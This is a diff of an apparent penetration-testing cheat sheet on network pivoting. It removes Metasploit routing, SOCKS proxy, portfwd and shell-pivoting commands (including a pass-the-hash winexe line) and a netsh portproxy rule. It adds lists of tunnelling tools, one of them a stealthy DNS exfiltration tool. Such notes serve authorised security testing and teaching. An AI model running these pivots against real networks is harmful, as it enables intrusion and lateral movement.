@@ -6,121 +6,6 @@
 plink.exe -l root -R 445:127.0.0.1:445 YOURIPADDRESS
 ```
 
-## Metasploit
-
-### MANUAL ROUTE
-
-this method will give the full access to the target IP address like its siting in our lan ( only accessible in metasploit )
-
-```
-background the session
-route add 10.0.1.0/24 [session id]
-```
-
-### AUTO ROUTE
-
-this method will give the full access to the target IP address like its siting in our lan ( only accessible in metasploit )
-
-```
-run autoroute -p >>> list active routing tables
-run autoroute -s 10.1.1.0 -n 255.255.255.0 >>> netmask is optional
-run autoroute -d -s 10.10.10.1  >>> delete autoroute on ip
-run autoroute -s 10.10.10.1/24 >>> can use CIDR
-```
-
-### PROXY
-
-add a proxy to proxychains.conf and use it inside and outside of metasploit
-
-```
-use auxiliary/server/socks4a
-use auxiliary/server/socks5
-use auxiliary/server/socks_unc
-set srvport 8080 → set proxy local port
-```
-
-add 127.0.0.1 8080 to proxychains and make sure there are no other proxies in the config file:
-
-```
-socks4  127.0.0.1  8080
-```
-
-now run commands with proxychains prefix
-
-```
-proxychains nmap -Pn -sT -sV -p- [target]
-proxychains pth-winexe -U windows10/user123//10.0.1.5 cmd.exe
-```
-
-### PORT FORWARD
-
-forward only the given remote port to the given local port specifically ( only accessible in msfconsole )
-
-```
-portfwd [add | delete | list | flush]  -L [optional local ip] -l [local port] -p [remote port] -r [remote ip]
-
-portfwd add -L 0.0.0.0 -l 8000 -p 80 -r 10.1.0.5
-```
-
-now we can scan our local port 8000 to scan the remote port 80 of the target
-
-### PIVOTING BIND SHELL
-
-usually used when exploiting a machine in the internal network. first we have to do port forwarding to scan the network
-
-```
-portfwd add -L 0.0.0.0 -l 8000 -p 80 -r 10.1.0.5
-```
-
-now add a route to target ip in the internal network
-
-```
-route -h
-route add 10.0.1.5/24 [session number] 
-```
-
-now choose your exploit and set the rhost to the target ip in the internal network and run the exploit and remember:
-
-```
-background# meterpreter session
-route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 2552.55.255.0 8)
-use auxiliary/server/socks4a
-run #Proxy port 1080 by default
-echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
-```
-
-Another way:
-
-```
-background #meterpreter session
-use post/windows/manage/autoroute
-set SESSION <session_n>
-set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
-set NETMASK <Netmask>
-run
-use auxiliary/server/socks4a
-run #Proxy port 1080 by default
-```
-
-{% hint style="warning" %}
-ALLWAYS USE A BIND SHELL WHILE PIVOTING
-{% endhint %}
-
-if we use a reverse shell the target machine on the internal network wont be able to route back the packets to us
-
-![](<../../.gitbook/assets/image (267).png>)
-
-### PIVOTING REVERSE SHELL
-
-while using a reverse shell with pivoting we have to set the RHOST to target ip in the internal network and set the LHOST to the machine that we have already compromized
-
-```
-RHOST >>> internal target
-LHOST >>> compromized machine
-```
-
-![](<../../.gitbook/assets/image (269).png>)
-
 ## Ncat
 
 ```
@@ -171,24 +56,35 @@ service rinetd restart
 
 bind address is attacker machine bind port is the listening incoming port connectaddress is the address to forward the traffic to and connectport is the target port.
 
-## NETSH (Windows)
+## Other Resources
 
-{% hint style="warning" %}
-for this to work, the Windows system must have the IP Helper service running and IPv6 support must be enabled for the interface we want to use. Fortunately, both are on and enabled by default on Windows operating systems.
-{% endhint %}
+* [NetworkPivotingTechniques](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)
+* [Abachy's Port Forwarding Guide](https://www.abatchy.com/2017/01/port-forwarding-practical-hands-on-guide)&#x20;
+* [http://woshub.com/port-forwarding-in-windows/](http://woshub.com/port-forwarding-in-windows/)
+* [https://www.offensive-security.com/metasploit-unleashed/portfwd/](https://www.offensive-security.com/metasploit-unleashed/portfwd/)
+* [https://pentest.blog/explore-hidden-networks-with-double-pivoting/](https://pentest.blog/explore-hidden-networks-with-double-pivoting/)
+* [https://fumenoid.github.io/posts/port-forwarding](https://fumenoid.github.io/posts/port-forwarding)
+* [https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/](https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/)
+* [https://www.offensive-security.com/metasploit-unleashed/proxytunnels/](https://www.offensive-security.com/metasploit-unleashed/proxytunnels/)
+* [https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html](https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html)
+* [https://www.cynet.com/attack-techniques-hands-on/how-hackers-use-icmp-tunneling-to-own-your-network/](https://www.cynet.com/attack-techniques-hands-on/how-hackers-use-icmp-tunneling-to-own-your-network/)
+* [https://xapax.github.io/security/#random\_tips\_and\_tricks/port\_forwarding\_and\_tunneling/](https://xapax.github.io/security/#random\_tips\_and\_tricks/port\_forwarding\_and\_tunneling/)
+* [https://xapax.github.io/security/#random\_tips\_and\_tricks/pivoting/](https://xapax.github.io/security/#random\_tips\_and\_tricks/pivoting/)
 
-```
-netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110
-netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow
-```
+## Other Tools
 
-test:
-
-```
-smbclient -L 10.11.0.22 --port=4455 --user=Administrator
-```
-
-
-
-
-
+* [PivotSuite](https://github.com/RedTeamOperations/PivotSuite) - PivotSuite is a portable, platform independent and powerful network pivoting toolkit, Which helps Red Teamers / Penetration Testers to use a compromised system to move around inside a network.
+* [Modaliska](https://github.com/drk1wi/Modlishka)  - Modlishka is a powerful and flexible HTTP reverse proxy. It implements an entirely new and interesting approach of handling browser-based HTTP traffic flow, which allows to transparently proxy multi-domain destination traffic, both TLS and non-TLS, over a single domain, without a requirement of installing any additional certificate on the client.
+* [Iodine](https://github.com/yarrick/iodine) - This is a piece of software that lets you tunnel IPv4 data through a DNS server. This can be usable in different situations where internet access is firewalled, but DNS queries are allowed.
+* [Mallory](https://github.com/justmao945/mallory) - HTTP/HTTPS proxy over SSH.
+* [Pivotnacci](https://github.com/blackarrowsec/pivotnacci) - Pivot into the internal network by deploying HTTP agents.
+* [PacketWhisper](https://github.com/TryCatchHCF/PacketWhisper) - PacketWhisper: Stealthily exfiltrate data and defeat attribution using DNS queries and text-based steganography. Avoid the problems associated with typical DNS exfiltration methods. Transfer data between systems without the communicating devices directly connecting to each other or to a common endpoint. No need to control a DNS Name Server.
+* [chisel](https://www.kali.org/tools/chisel/) - This package contains a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.
+* [cryptcat](https://www.kali.org/tools/cryptcat/) - Cryptcat is a simple Unix utility which reads and writes data across network connections, using TCP or UDP protocol while encrypting the data being transmitted.
+* [dns2tcp](https://www.kali.org/tools/dns2tcp/) - dns2tcp is a set of tools to encapsulate a TCP session in DNS packets. This type of encapsulation generates smaller packets than IP-over-DNS, improving throughput.
+* [dnschef](https://www.kali.org/tools/dnschef/) - DNSChef is a highly configurable DNS proxy for Penetration Testers and Malware Analysts.
+* [iodine](https://www.kali.org/tools/iodine/) - This is a piece of software that lets you tunnel IPv4 data through a DNS server. This can be usable in different situations where internet access is firewalled, but DNS queries are allowed.
+* [miredo](https://www.kali.org/tools/miredo/) - A client for the Teredo IPV6 tunneling protocol.
+* [nextnet](https://www.kali.org/tools/nextnet/) - This package contains a pivot point discovery tool written in Go.
+* [redsocks](https://www.kali.org/tools/redsocks/) - Redsocks is a daemon running on the local system, that will transparently tunnel any TCP connection via a remote SOCKS4, SOCKS5 or HTTP proxy server.
+* [sslh](https://www.kali.org/tools/sslh/) - sslh lets one accept HTTPS, SSH, OpenVPN, tinc and XMPP connections on the same port. This makes it possible to connect to any of these servers on port 443 (e.g. from inside a corporate firewall, which almost never block port 443) while still serving HTTPS on that port
